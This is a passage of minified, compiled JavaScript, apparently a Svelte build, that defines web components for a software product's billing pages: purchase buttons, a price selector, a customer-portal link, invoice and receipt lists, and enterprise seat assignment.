      c,
      async function d() {
        var I;
        t(1, (r = !0)),
          t(
            3,
            (l = await ge({
              fn: "createPaymentSession",
              payload: {
                productType: i ? "enterprise" : "lifetime",
                price: s,
                seats: i ? a : 1,
              },
            }))
          ),
          l && (null == (I = window.open(l, "_blank")) || I.focus()),
          t(1, (r = !1));
      },
      () => c(a - 1),
      function f() {
        (a = Ts(this.value)), t(2, a);
      },
      (I) => c(I.target.value),
      () => c(a + 1),
    ]
  );
}
customElements.define("buy-pro", ag);
class ug extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>input{margin-left:auto;margin-right:auto;width:3rem;border-style:none;--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));padding:0.5rem;text-align:center;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}.btn{margin-top:0.125rem;margin-bottom:0.125rem;display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(168 85 247 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none;--tw-shadow:0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color), 0 2px 4px -2px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);outline:2px solid transparent;outline-offset:2px\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(126 34 206 / var(--tw-bg-opacity))\n}.btn:disabled{cursor:not-allowed;opacity:0.7\n}.btn-blue{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity))\n}.btn-blue:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}.btn-o{margin:0px;cursor:pointer;border-radius:0.125rem;border-width:1px;border-style:solid;--tw-border-opacity:1;border-color:rgb(249 115 22 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity));padding:0.375rem;font-family:sofia-pro, sans-serif;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms\n}.btn-o:hover{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))\n}.controls{margin-top:0.75rem;margin-bottom:0.75rem;text-align:center\n}a{display:block;text-align:center;font-size:0.875rem;line-height:1.25rem;--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        cg,
        lg,
        G,
        { enterprise: 0 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["enterprise"];
  }
  get enterprise() {
    return this.$$.ctx[0];
  }
  set enterprise(e) {
    this.$$set({ enterprise: e }), W();
  }
}
function Do(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function dg(n) {
  let e,
    t,
    i,
    o,
    s,
    r = n[0] ? "loading..." : "subscription & invoices",
    a = n[0] && Do();
  return {
    c() {
      (e = b("button")), a && a.c(), (t = E()), (i = A(r)), (this.c = k);
    },
    m(l, c) {
      p(l, e, c),
        a && a.m(e, null),
        h(e, t),
        h(e, i),
        o || ((s = O(e, "click", n[1])), (o = !0));
    },
    p(l, [c]) {
      l[0] ? a || ((a = Do()), a.c(), a.m(e, t)) : a && (a.d(1), (a = null)),
        1 & c &&
          r !== (r = l[0] ? "loading..." : "subscription & invoices") &&
          U(i, r);
    },
    i: k,
    o: k,
    d(l) {
      l && g(e), a && a.d(), (o = !1), s();
    },
  };
}
function fg(n, e, t) {
  let r = !1;
  return [
    r,
    async function i() {
      var s;
      t(0, (r = !0));
      const o = await ge({ fn: "createPortalSession", payload: {} });
      o && (null == (s = window.open(o, "_blank")) || s.focus()),
        t(0, (r = !1));
    },
  ];
}
customElements.define("buy-lifetime", ug);
class pg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        fg,
        dg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Uo(n, e, t) {
  const r = n.slice();
  return (r[4] = e[t]), r;
}
function Fo(n) {
  let e,
    t,
    i,
    o,
    s,
    r = n[0] ? "loading..." : "get receipts",
    a = n[0] && Ho();
  return {
    c() {
      (e = b("button")), a && a.c(), (t = E()), (i = A(r));
    },
    m(l, c) {
      p(l, e, c),
        a && a.m(e, null),
        h(e, t),
        h(e, i),
        o || ((s = O(e, "click", n[2])), (o = !0));
    },
    p(l, c) {
      l[0] ? a || ((a = Ho()), a.c(), a.m(e, t)) : a && (a.d(1), (a = null)),
        1 & c && r !== (r = l[0] ? "loading..." : "get receipts") && U(i, r);
    },
    d(l) {
      l && g(e), a && a.d(), (o = !1), s();
    },
  };
}
function Ho(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function jo(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l = n[1],
    c = [];
  for (let u = 0; u < l.length; u += 1) c[u] = zo(Uo(n, l, u));
  let d = !n[1].length && Bo();
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Hide Receipts"),
        (t = E()),
        (r = b("ul"));
      for (let u = 0; u < c.length; u += 1) c[u].c();
      (i = E()), d && d.c(), (o = ee());
    },
    m(u, f) {
      p(u, e, f), p(u, t, f), p(u, r, f);
      for (let m = 0; m < c.length; m += 1) c[m].m(r, null);
      p(u, i, f),
        d && d.m(u, f),
        p(u, o, f),
        s || ((a = O(e, "click", n[3])), (s = !0));
    },
    p(u, f) {
      if (2 & f) {
        let m;
        for (l = u[1], m = 0; m < l.length; m += 1) {
          const y = Uo(u, l, m);
          c[m] ? c[m].p(y, f) : ((c[m] = zo(y)), c[m].c(), c[m].m(r, null));
        }
        for (; m < c.length; m += 1) c[m].d(1);
        c.length = l.length;
      }
      u[1].length
        ? d && (d.d(1), (d = null))
        : d || ((d = Bo()), d.c(), d.m(o.parentNode, o));
    },
    d(u) {
      u && g(e),
        u && g(t),
        u && g(r),
        at(c, u),
        u && g(i),
        d && d.d(u),
        u && g(o),
        (s = !1),
        a();
    },
  };
}
function zo(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    d,
    u,
    m,
    y,
    r = n[4].id + "",
    c = n[4].amount / 100 + "",
    f = new Date(1e3 * n[4].created).toLocaleDateString() + "";
  return {
    c() {
      (e = b("li")),
        (t = b("a")),
        (i = A(r)),
        (s = A(" for\n        ")),
        (a = b("strong")),
        (l = A("$")),
        (d = A(c)),
        (u = A(" on ")),
        (m = A(f)),
        (y = E()),
        w(t, "target", "_blank"),
        w(t, "href", (o = n[4].receipt_url));
    },
    m(I, v) {
      p(I, e, v),
        h(e, t),
        h(t, i),
        h(e, s),
        h(e, a),
        h(a, l),
        h(a, d),
        h(e, u),
        h(e, m),
        h(e, y);
    },
    p(I, v) {
      2 & v && r !== (r = I[4].id + "") && U(i, r),
        2 & v && o !== (o = I[4].receipt_url) && w(t, "href", o),
        2 & v && c !== (c = I[4].amount / 100 + "") && U(d, c),
        2 & v &&
          f !== (f = new Date(1e3 * I[4].created).toLocaleDateString() + "") &&
          U(m, f);
    },
    d(I) {
      I && g(e);
    },
  };
}
function Bo(n) {
  let e;
  return {
    c() {
      (e = b("p")), (e.textContent = "No charges found");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function hg(n) {
  let e,
    t,
    r = !n[1] && Fo(n),
    i = n[1] && jo(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[1]
        ? r && (r.d(1), (r = null))
        : r
        ? r.p(o, s)
        : ((r = Fo(o)), r.c(), r.m(e.parentNode, e)),
        o[1]
          ? i
            ? i.p(o, s)
            : ((i = jo(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function mg(n, e, t) {
  let r = !1,
    i = null;
  return [
    r,
    i,
    async function o() {
      var l;
      t(0, (r = !0));
      const a =
        null != (l = await ge({ fn: "getCharges", payload: {} })) ? l : [];
      t(1, (i = a.data || [])), t(0, (r = !1));
    },
    () => t(1, (i = null)),
  ];
}
customElements.define("customer-portal", pg);
class gg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}a{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        mg,
        hg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Vo(n) {
  let t,
    r,
    i,
    o,
    e = n[2][n[1]] + "";
  return {
    c() {
      (t = A(e)),
        (r = b("span")),
        (i = A("/")),
        (o = A(n[1])),
        w(r, "class", "period");
    },
    m(s, a) {
      p(s, t, a), p(s, r, a), h(r, i), h(r, o);
    },
    p(s, a) {
      2 & a && e !== (e = s[2][s[1]] + "") && U(t, e), 2 & a && U(o, s[1]);
    },
    d(s) {
      s && g(t), s && g(r);
    },
  };
}
function $o(n) {
  let e, t;
  return {
    c() {
      (e = b("span")), (t = A(n[1]));
    },
    m(r, i) {
      p(r, e, i), h(e, t);
    },
    p(r, i) {
      2 & i && U(t, r[1]);
    },
    d(r) {
      r && g(e);
    },
  };
}
function qo(n) {
  let e, t, r, i, o, s, a;
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Month"),
        (t = E()),
        (r = b("button")),
        (r.textContent = "Quarter"),
        (i = E()),
        (o = b("button")),
        (o.textContent = "Year"),
        w(e, "class", "btn"),
        Z(e, "active", "month" == n[1]),
        w(r, "class", "btn"),
        Z(r, "active", "quarter" == n[1]),
        w(o, "class", "btn"),
        Z(o, "active", "year" == n[1]);
    },
    m(l, c) {
      p(l, e, c),
        p(l, t, c),
        p(l, r, c),
        p(l, i, c),
        p(l, o, c),
        s ||
          ((a = [
            O(e, "click", n[3]),
            O(r, "click", n[4]),
            O(o, "click", n[5]),
          ]),
          (s = !0));
    },
    p(l, c) {
      2 & c && Z(e, "active", "month" == l[1]),
        2 & c && Z(r, "active", "quarter" == l[1]),
        2 & c && Z(o, "active", "year" == l[1]);
    },
    d(l) {
      l && g(e), l && g(t), l && g(r), l && g(i), l && g(o), (s = !1), fe(a);
    },
  };
}
function bg(n) {
  let e,
    t,
    r,
    i = "amount" == n[0] && Vo(n),
    o = "period" == n[0] && $o(n),
    s = "control" == n[0] && qo(n);
  return {
    c() {
      i && i.c(),
        (e = E()),
        o && o.c(),
        (t = E()),
        s && s.c(),
        (r = ee()),
        (this.c = k);
    },
    m(a, l) {
      i && i.m(a, l),
        p(a, e, l),
        o && o.m(a, l),
        p(a, t, l),
        s && s.m(a, l),
        p(a, r, l);
    },
    p(a, [l]) {
      "amount" == a[0]
        ? i
          ? i.p(a, l)
          : ((i = Vo(a)), i.c(), i.m(e.parentNode, e))
        : i && (i.d(1), (i = null)),
        "period" == a[0]
          ? o
            ? o.p(a, l)
            : ((o = $o(a)), o.c(), o.m(t.parentNode, t))
          : o && (o.d(1), (o = null)),
        "control" == a[0]
          ? s
            ? s.p(a, l)
            : ((s = qo(a)), s.c(), s.m(r.parentNode, r))
          : s && (s.d(1), (s = null));
    },
    i: k,
    o: k,
    d(a) {
      i && i.d(a), a && g(e), o && o.d(a), a && g(t), s && s.d(a), a && g(r);
    },
  };
}
function wg(n, e, t) {
  let r;
  ie(n, Vt, (c) => t(1, (r = c)));
  let { show: i = "amount" } = e;
  return (
    (n.$$set = (c) => {
      "show" in c && t(0, (i = c.show));
    }),
    [
      i,
      r,
      { month: 29, quarter: 69, year: 199 },
      () => Vt.set("month"),
      () => Vt.set("quarter"),
      () => Vt.set("year"),
    ]
  );
}
customElements.define("user-charges", gg);
class _g extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.btn{margin:0px;cursor:pointer;border-radius:0.375rem;border-width:1px;border-style:solid;--tw-border-opacity:1;border-color:rgb(249 115 22 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity));padding:0.375rem;font-family:sofia-pro, sans-serif;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))\n}.btn.active{--tw-bg-opacity:1;background-color:rgb(249 115 22 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))\n}.period{font-family:sofia-pro, sans-serif;font-size:1rem;line-height:1.5rem;--tw-text-opacity:1;color:rgb(219 225 232 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        wg,
        bg,
        G,
        { show: 0 },
        null
      ),
      e &&
        (e.target && p(e.target, this, e.anchor),
        e.props && (this.$set(e.props), W()));
  }
  static get observedAttributes() {
    return ["show"];
  }
  get show() {
    return this.$$.ctx[0];
  }
  set show(e) {
    this.$$set({ show: e }), W();
  }
}
function Wo(n, e, t) {
  const r = n.slice();
  return (r[13] = e[t]), r;
}
function Go(n) {
  var q;
  let e,
    t,
    r,
    i,
    s,
    a,
    c,
    d,
    u,
    f,
    m,
    y,
    I,
    v,
    R,
    L,
    _,
    P,
    te,
    o = n[5].length + "",
    l = (null == (q = n[0]) ? void 0 : q.seats) + "";
  function ne(H, M) {
    return H[5] ? vg : yg;
  }
  let D = ne(n),
    z = D(n),
    B = n[1] && Yo();
  return {
    c() {
      (e = b("h2")),
        (e.textContent = "Assign Seats"),
        (t = E()),
        (r = b("p")),
        (i = A("You have used ")),
        (s = A(o)),
        (a = A(" of ")),
        (c = A(l)),
        (d = A(" seats")),
        (u = E()),
        (f = b("div")),
        z.c(),
        (m = E()),
        (y = b("div")),
        (I = b("input")),
        (v = E()),
        (R = b("button")),
        B && B.c(),
        (L = A("\n            assign")),
        w(I, "type", "email"),
        w(I, "placeholder", "email"),
        (I.required = !0),
        w(R, "class", "btn"),
        (R.disabled = _ = n[1] || !n[2] || !n[3]),
        w(y, "class", "seat"),
        w(f, "class", "wrap");
    },
    m(H, M) {
      p(H, e, M),
        p(H, t, M),
        p(H, r, M),
        h(r, i),
        h(r, s),
        h(r, a),
        h(r, c),
        h(r, d),
        p(H, u, M),
        p(H, f, M),
        z.m(f, null),
        h(f, m),
        h(f, y),
        h(y, I),
        de(I, n[3]),
        n[12](I),
        h(y, v),
        h(y, R),
        B && B.m(R, null),
        h(R, L),
        P ||
          ((te = [
            O(I, "input", n[11]),
            O(I, "input", n[7]),
            O(R, "click", n[8]),
          ]),
          (P = !0));
    },
    p(H, M) {
      var X;
      32 & M && o !== (o = H[5].length + "") && U(s, o),
        1 & M &&
          l !== (l = (null == (X = H[0]) ? void 0 : X.seats) + "") &&
          U(c, l),
        D === (D = ne(H)) && z
          ? z.p(H, M)
          : (z.d(1), (z = D(H)), z && (z.c(), z.m(f, m))),
        8 & M && I.value !== H[3] && de(I, H[3]),
        H[1] ? B || ((B = Yo()), B.c(), B.m(R, L)) : B && (B.d(1), (B = null)),
        14 & M && _ !== (_ = H[1] || !H[2] || !H[3]) && (R.disabled = _);
    },
    d(H) {
      H && g(e),
        H && g(t),
        H && g(r),
        H && g(u),
        H && g(f),
        z.d(),
        n[12](null),
        B && B.d(),
        (P = !1),
        fe(te);
    },
  };
}
function yg(n) {
  let e;
  return {
    c() {
      (e = b("p")), (e.textContent = "You have not assigned any seats yet");
    },
    m(t, r) {
      p(t, e, r);
    },
    p: k,
    d(t) {
      t && g(e);
    },
  };
}
function vg(n) {
  let e,
    t = n[5],
    r = [];
  for (let i = 0; i < t.length; i += 1) r[i] = Ko(Wo(n, t, i));
  return {
    c() {
      for (let i = 0; i < r.length; i += 1) r[i].c();
      e = ee();
    },
    m(i, o) {
      for (let s = 0; s < r.length; s += 1) r[s].m(i, o);
      p(i, e, o);
    },
    p(i, o) {
      if (546 & o) {
        let s;
        for (t = i[5], s = 0; s < t.length; s += 1) {
          const a = Wo(i, t, s);
          r[s]
            ? r[s].p(a, o)
            : ((r[s] = Ko(a)), r[s].c(), r[s].m(e.parentNode, e));
        }
        for (; s < r.length; s += 1) r[s].d(1);
        r.length = t.length;
      }
    },
    d(i) {
      at(r, i), i && g(e);
    },
  };
}
function Ko(n) {
  let e,
    r,
    i,
    o,
    a,
    l,
    c,
    d,
    t = n[13] + "";
  function u() {
    return n[10](n[13]);
  }
  return {
    c() {
      (e = b("div")),
        (r = A(t)),
        (i = E()),
        (o = b("button")),
        (a = A("revoke")),
        (l = E()),
        w(o, "class", "btn btn-red"),
        (o.disabled = n[1]),
        w(e, "class", "seat");
    },
    m(f, m) {
      p(f, e, m),
        h(e, r),
        h(e, i),
        h(e, o),
        h(o, a),
        h(e, l),
        c || ((d = O(o, "click", u)), (c = !0));
    },
    p(f, m) {
      (n = f),
        32 & m && t !== (t = n[13] + "") && U(r, t),
        2 & m && (o.disabled = n[1]);
    },
    d(f) {
      f && g(e), (c = !1), d();
    },
  };
}
function Yo(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function kg(n) {
  var r;
  let e,
    t = (null == (r = n[6]) ? void 0 : r.enterprise) && Go(n);
  return {
    c() {
      t && t.c(), (e = ee()), (this.c = k);
    },
    m(i, o) {
      t && t.m(i, o), p(i, e, o);
    },
    p(i, [o]) {
      var s;
      null != (s = i[6]) && s.enterprise
        ? t
          ? t.p(i, o)
          : ((t = Go(i)), t.c(), t.m(e.parentNode, e))
        : t && (t.d(1), (t = null));
    },
    i: k,
    o: k,
    d(i) {
      t && t.d(i), i && g(e);
    },
  };
}
function Ig(n, e, t) {
  let r, i, o;
  ie(n, hr, (v) => t(0, (i = v))), ie(n, gt, (v) => t(6, (o = v)));
  let l,
    c,
    s = !1,
    a = !1;
  async function f(v) {
    t(1, (s = !0)),
      await ge({ fn: "seatAssign", payload: { email: v, revoke: !0 } }),
      t(1, (s = !1));
  }
  return (
    (n.$$.update = () => {
      1 & n.$$.dirty &&
        t(5, (r = Object.keys((null == i ? void 0 : i.assigned) || {})));
    }),
    [
      i,
      s,
      a,
      l,
      c,
      r,
      o,
      function d() {
        t(2, (a = c.validity.valid));
      },
      async function u() {
        t(1, (s = !0)),
          await ge({ fn: "seatAssign", payload: { email: l } }),
          t(1, (s = !1)),
          t(3, (l = ""));
      },
      f,
      (v) => f(v),
      function y() {
        (l = this.value), t(3, l);
      },
      function I(v) {
        st[v ? "unshift" : "push"](() => {
          (c = v), t(4, c);
        });
      },
    ]
  );
}
customElements.define("price-select", _g);
class Eg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>.seat{margin-top:0.25rem;margin-bottom:0.25rem;display:flex;justify-content:space-between;--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity));padding:0.75rem\n}.btn{margin:0px;cursor:pointer;border-radius:0.125rem;border-width:1px;border-style:solid;--tw-border-opacity:1;border-color:rgb(59 130 246 / var(--tw-border-opacity));--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity));padding:0.375rem;font-family:sofia-pro, sans-serif;font-size:0.75rem;line-height:1rem;--tw-text-opacity:1;color:rgb(178 190 205 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px;transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms\n}.btn:hover{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity))\n}.btn:disabled{cursor:not-allowed;opacity:0.6\n}.btn-red{margin-left:0.5rem;--tw-border-opacity:1;border-color:rgb(239 68 68 / var(--tw-border-opacity))\n}.btn-red:hover{--tw-bg-opacity:1;background-color:rgb(239 68 68 / var(--tw-bg-opacity))\n}input{margin-right:0.75rem;width:100%;border-style:none;--tw-bg-opacity:1;background-color:rgb(18 24 27 / var(--tw-bg-opacity));padding:0.75rem;font-family:sofia-pro, sans-serif;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));outline:2px solid transparent;outline-offset:2px\n}.wrap{display:flex;max-width:500px;flex-direction:column\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Ig,
        kg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function Jo(n, e, t) {
  const r = n.slice();
  return (r[4] = e[t]), r;
}
function Xo(n) {
  let e,
    t,
    i,
    o,
    s,
    r = n[0] ? "loading..." : "get invoices",
    a = n[0] && Zo();
  return {
    c() {
      (e = b("button")), a && a.c(), (t = E()), (i = A(r));
    },
    m(l, c) {
      p(l, e, c),
        a && a.m(e, null),
        h(e, t),
        h(e, i),
        o || ((s = O(e, "click", n[2])), (o = !0));
    },
    p(l, c) {
      l[0] ? a || ((a = Zo()), a.c(), a.m(e, t)) : a && (a.d(1), (a = null)),
        1 & c && r !== (r = l[0] ? "loading..." : "get invoices") && U(i, r);
    },
    d(l) {
      l && g(e), a && a.d(), (o = !1), s();
    },
  };
}
function Zo(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Qo(n) {
  let e,
    t,
    r,
    i,
    o,
    s,
    a,
    l = n[1],
    c = [];
  for (let u = 0; u < l.length; u += 1) c[u] = es(Jo(n, l, u));
  let d = !n[1].length && ts();
  return {
    c() {
      (e = b("button")),
        (e.textContent = "Hide Invoices"),
        (t = E()),
        (r = b("ul"));
      for (let u = 0; u < c.length; u += 1) c[u].c();
      (i = E()), d && d.c(), (o = ee());
    },
    m(u, f) {
      p(u, e, f), p(u, t, f), p(u, r, f);
      for (let m = 0; m < c.length; m += 1) c[m].m(r, null);
      p(u, i, f),
        d && d.m(u, f),
        p(u, o, f),
        s || ((a = O(e, "click", n[3])), (s = !0));
    },
    p(u, f) {
      if (2 & f) {
        let m;
        for (l = u[1], m = 0; m < l.length; m += 1) {
          const y = Jo(u, l, m);
          c[m] ? c[m].p(y, f) : ((c[m] = es(y)), c[m].c(), c[m].m(r, null));
        }
        for (; m < c.length; m += 1) c[m].d(1);
        c.length = l.length;
      }
      u[1].length
        ? d && (d.d(1), (d = null))
        : d || ((d = ts()), d.c(), d.m(o.parentNode, o));
    },
    d(u) {
      u && g(e),
        u && g(t),
        u && g(r),
        at(c, u),
        u && g(i),
        d && d.d(u),
        u && g(o),
        (s = !1),
        a();
    },
  };
}
function es(n) {
  let e,
    t,
    i,
    o,
    s,
    a,
    l,
    d,
    u,
    m,
    y,
    r = n[4].id + "",
    c = n[4].amount_due / 100 + "",
    f = new Date(1e3 * n[4].created).toLocaleDateString() + "";
  return {
    c() {
      (e = b("li")),
        (t = b("a")),
        (i = A(r)),
        (s = A(" for\n        ")),
        (a = b("strong")),
        (l = A("$")),
        (d = A(c)),
        (u = A(" on ")),
        (m = A(f)),
        (y = E()),
        w(t, "target", "_blank"),
        w(t, "href", (o = n[4].hosted_invoice_url));
    },
    m(I, v) {
      p(I, e, v),
        h(e, t),
        h(t, i),
        h(e, s),
        h(e, a),
        h(a, l),
        h(a, d),
        h(e, u),
        h(e, m),
        h(e, y);
    },
    p(I, v) {
      2 & v && r !== (r = I[4].id + "") && U(i, r),
        2 & v && o !== (o = I[4].hosted_invoice_url) && w(t, "href", o),
        2 & v && c !== (c = I[4].amount_due / 100 + "") && U(d, c),
        2 & v &&
          f !== (f = new Date(1e3 * I[4].created).toLocaleDateString() + "") &&
          U(m, f);
    },
    d(I) {
      I && g(e);
    },
  };
}
function ts(n) {
  let e;
  return {
    c() {
      (e = b("p")), (e.textContent = "No invoices found");
    },
    m(t, r) {
      p(t, e, r);
    },
    d(t) {
      t && g(e);
    },
  };
}
function Tg(n) {
  let e,
    t,
    r = !n[1] && Xo(n),
    i = n[1] && Qo(n);
  return {
    c() {
      r && r.c(), (e = E()), i && i.c(), (t = ee()), (this.c = k);
    },
    m(o, s) {
      r && r.m(o, s), p(o, e, s), i && i.m(o, s), p(o, t, s);
    },
    p(o, [s]) {
      o[1]
        ? r && (r.d(1), (r = null))
        : r
        ? r.p(o, s)
        : ((r = Xo(o)), r.c(), r.m(e.parentNode, e)),
        o[1]
          ? i
            ? i.p(o, s)
            : ((i = Qo(o)), i.c(), i.m(t.parentNode, t))
          : i && (i.d(1), (i = null));
    },
    i: k,
    o: k,
    d(o) {
      r && r.d(o), o && g(e), i && i.d(o), o && g(t);
    },
  };
}
function Sg(n, e, t) {
  let r = !1,
    i = null;
  return [
    r,
    i,
    async function o() {
      var l;
      t(0, (r = !0));
      const a =
        null != (l = await ge({ fn: "getInvoices", payload: {} })) ? l : [];
      console.log(a), t(1, (i = a.data || [])), t(0, (r = !1));
    },
    () => t(1, (i = null)),
  ];
}
customElements.define("seat-assign", Eg);
class Cg extends K {
  constructor(e) {
    super(),
      (this.shadowRoot.innerHTML =
        "<style>button{display:inline-flex;cursor:pointer;border-style:none;--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity));padding-left:1.25rem;padding-right:1.25rem;padding-top:0.5rem;padding-bottom:0.5rem;text-align:center;font-family:sofia-pro, sans-serif;font-size:0.875rem;line-height:1.25rem;font-weight:700;text-transform:uppercase;--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity));-webkit-text-decoration-line:none;text-decoration-line:none\n}button:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity))\n}button:active{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity))\n}a{--tw-text-opacity:1;color:rgb(59 130 246 / var(--tw-text-opacity))\n}</style>"),
      J(
        this,
        {
          target: this.shadowRoot,
          props: Y(this.attributes),
          customElement: !0,
        },
        Sg,
        Tg,
        G,
        {},
        null
      ),
      e && e.target && p(e.target, this, e.anchor);
  }
}
function ns(n, e, t) {
  const r = n.slice();
  return (r[8] = e[t]), r;
}
function rs(n) {
  let e,
    t,
    i,
    o,
    s,
    r = n[0] ? "loading..." : "manage subscription",
    a = n[0] && is();
  return {
    c() {
      (e = b("button")), a && a.c(), (t = E()), (i = A(r));
    },
    m(l, c) {
      p(l, e, c),
        a && a.m(e, null),
        h(e, t),
        h(e, i),
        o || ((s = O(e, "click", n[2])), (o = !0));
    },
    p(l, c) {
      l[0] ? a || ((a = is()), a.c(), a.m(e, t)) : a && (a.d(1), (a = null)),
        1 & c &&
          r !== (r = l[0] ? "loading..." : "manage subscription") &&
          U(i, r);
    },
    d(l) {
      l && g(e), a && a.d(), (o = !1), s();
    },
  };
}
function is(n) {
  let e;
  return {
    c() {
      e = b("loading-spinner");
    },
    m(t, r) {
      p(t, e, r);
    },
